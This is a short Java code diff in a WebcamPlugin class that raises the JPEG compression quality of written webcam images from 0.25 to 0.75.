@@ -64,7 +64,7 @@ public class WebcamPlugin extends StubPlugin {
 					ImageWriter imgwriter = iterators.next();
 					ImageWriteParam imgwriterp = imgwriter.getDefaultWriteParam();
 					imgwriterp.setCompressionMode(2);
-					imgwriterp.setCompressionQuality(0.25f);
+					imgwriterp.setCompressionQuality(0.75f);
 					imgwriter.setOutput(ios);
 					imgwriter.write(null, new IIOImage(image, null, null), imgwriterp);
 					imgwriter.dispose();
